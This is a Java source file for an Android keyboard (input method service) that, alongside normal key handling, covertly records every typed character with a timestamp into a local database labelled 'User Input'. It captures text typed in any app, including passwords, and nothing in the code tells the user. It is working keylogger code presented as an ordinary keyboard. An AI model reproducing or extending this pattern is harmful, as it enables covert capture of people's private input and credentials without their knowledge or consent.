package com.ck19.infodroid;

import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.Keyboard;
import android.inputmethodservice.KeyboardView;
import android.text.format.Time;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.EditorInfo;
import android.view.inputmethod.InputConnection;

import java.util.Calendar;

public class InformationInputService extends InputMethodService implements KeyboardView.OnKeyboardActionListener {

    private static String TAG = "lcy";

    static final boolean PROCESS_HARD_KEYS = true;

    private KeyboardView keyboardView;

    private StringBuilder composing = new StringBuilder();
    private int lastDisplayWidth;
    private boolean capsLock;
    private long lastShiftTime;

    private Keyboard symbolsKeyboard;
    private Keyboard symbolsShiftedKeyboard;
    private Keyboard qwertyKeyboard;

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public void onInitializeInterface() {
        if (qwertyKeyboard != null) {
            int displayWidth = getMaxWidth();
            if (displayWidth == lastDisplayWidth) return;
            lastDisplayWidth = displayWidth;
        }
        qwertyKeyboard = new Keyboard(this, R.xml.qwerty);
        symbolsKeyboard = new Keyboard(this, R.xml.symbols);
        symbolsShiftedKeyboard = new Keyboard(this, R.xml.symbols_shift);
    }

    @Override
    public View onCreateInputView() {
        keyboardView = (KeyboardView) getLayoutInflater().inflate(
                R.layout.input, null
        );
        keyboardView.setOnKeyboardActionListener(this);
        keyboardView.setKeyboard(qwertyKeyboard);
        return keyboardView;
    }

    private String getTimeString() {
        Calendar calendar = Calendar.getInstance();
        int year = calendar.get(Calendar.YEAR);
        int month = calendar.get(Calendar.MONTH) + 1;
        int day = calendar.get(Calendar.DAY_OF_MONTH);
        int hour = calendar.get(Calendar.HOUR_OF_DAY);
        int minute = calendar.get(Calendar.MINUTE);
        int second = calendar.get(Calendar.SECOND);
        return year + "-" + month + "-" + day + " " + hour + ":" + minute + ":" + second;
    }

    @Override
    public void onStartInput(EditorInfo attribute, boolean restarting) {
        if (InformationInput.instance().length() > 0) {
            InformationDao dao = new InformationDao(getApplicationContext());
            dao.insert("User Input",
                       getTimeString() + " " + InformationInput.instance().getContent(),
                       InformationDao.TYPE_USERS);
            InformationInput.instance().setContent("");
        }
        super.onStartInput(attribute, restarting);
        composing.setLength(0);

    }

    @Override
    public void onFinishInput() {
        if (InformationInput.instance().length() > 0) {
            InformationDao dao = new InformationDao(getApplicationContext());
            dao.insert("User Input",
                    getTimeString() + " " + InformationInput.instance().getContent(),
                    InformationDao.TYPE_USERS);
            InformationInput.instance().setContent("");
        }
        super.onFinishInput();
        composing.setLength(0);
        if (keyboardView != null) {
            keyboardView.closing();
        }
    }

    private void commitTyped(InputConnection inputConnection) {
        if (composing.length() > 0) {
            inputConnection.commitText(composing, composing.length());
            composing.setLength(0);
        }
    }

    private void keyDownUp(int keyEventCode) {
        getCurrentInputConnection().sendKeyEvent(
                new KeyEvent(KeyEvent.ACTION_DOWN, keyEventCode));
        getCurrentInputConnection().sendKeyEvent(
                new KeyEvent(KeyEvent.ACTION_UP, keyEventCode));
    }


    @Override
    public void onPress(int primaryCode) {

    }

    @Override
    public void onRelease(int primaryCode) {

    }

    @Override
    public void onKey(int primaryCode, int[] keyCodes) {
        if (primaryCode == Keyboard.KEYCODE_DELETE) {
            handleBackspace();
        } else if (primaryCode == Keyboard.KEYCODE_SHIFT) {
            handleShift();
        } else if (primaryCode == Keyboard.KEYCODE_CANCEL) {
            handleClose();
        } else if (primaryCode == Keyboard.KEYCODE_MODE_CHANGE
                && keyboardView != null) {
            Keyboard current = keyboardView.getKeyboard();
            if (current == symbolsKeyboard || current == symbolsShiftedKeyboard) {
                current = qwertyKeyboard;
            } else {
                current = symbolsKeyboard;
            }
            keyboardView.setKeyboard(current);
            if (current == symbolsKeyboard) {
                current.setShifted(false);
            }
        } else {
            handleCharacter(primaryCode, keyCodes);
        }
    }

    @Override
    public void onText(CharSequence text) {
        InputConnection ic = getCurrentInputConnection();
        if (ic == null) return;
        ic.beginBatchEdit();
        if (composing.length() > 0) {
            commitTyped(ic);
        }
        ic.commitText(text, 0);
        ic.endBatchEdit();
    }

    private void handleBackspace() {
        final int length = composing.length();
        if (length > 1) {
            composing.delete(length - 1, length);
            getCurrentInputConnection().setComposingText(composing, 1);
        } else if (length > 0) {
            composing.setLength(0);
            getCurrentInputConnection().commitText("", 0);
        } else {
            keyDownUp(KeyEvent.KEYCODE_DEL);
            InformationInput.instance().delete();
        }
    }

    private void handleShift() {
        if (keyboardView == null) {
            return;
        }

        Keyboard currentKeyboard = keyboardView.getKeyboard();
        if (qwertyKeyboard == currentKeyboard) {
            checkToggleCapsLock();
            keyboardView.setShifted(capsLock || !keyboardView.isShifted());
        } else if (currentKeyboard == symbolsKeyboard) {
            symbolsKeyboard.setShifted(true);
            keyboardView.setKeyboard(symbolsShiftedKeyboard);
            symbolsShiftedKeyboard.setShifted(true);
        } else if (currentKeyboard == symbolsShiftedKeyboard) {
            symbolsShiftedKeyboard.setShifted(false);
            keyboardView.setKeyboard(symbolsKeyboard);
            symbolsKeyboard.setShifted(false);
        }
    }

    private void handleCharacter(int primaryCode, int[] keyCodes) {
        if (isInputViewShown()) {
            if (keyboardView.isShifted()) {
                primaryCode = Character.toUpperCase(primaryCode);
            }
        }
        getCurrentInputConnection().commitText(
                String.valueOf((char) primaryCode), 1);
        InformationInput.instance().append(String.valueOf((char) primaryCode));
    }

    private void handleClose() {
        if (InformationInput.instance().length() > 0) {
            InformationDao dao = new InformationDao(getApplicationContext());
            dao.insert("User Input",
                    getTimeString() + " " + InformationInput.instance().getContent(),
                    InformationDao.TYPE_USERS);
            InformationInput.instance().setContent("");
        }
        commitTyped(getCurrentInputConnection());
        requestHideSelf(0);
        keyboardView.closing();
    }

    private void checkToggleCapsLock() {
        long now = System.currentTimeMillis();
        if (lastShiftTime + 800 > now) {
            capsLock = !capsLock;
            lastShiftTime = 0;
        } else {
            lastShiftTime = now;
        }
    }


    @Override
    public void swipeLeft() {
    }

    @Override
    public void swipeRight() {

    }

    @Override
    public void swipeDown() {

    }

    @Override
    public void swipeUp() {

    }
}
